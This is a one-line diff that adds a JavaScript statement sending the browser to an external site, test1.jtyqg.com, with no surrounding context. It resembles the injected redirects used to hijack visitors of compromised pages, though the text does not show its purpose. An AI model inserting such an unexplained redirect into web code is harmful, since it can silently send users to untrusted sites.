@@ -1,0 +1,1 @@
+window.location.href="https://test1.jtyqg.com/";
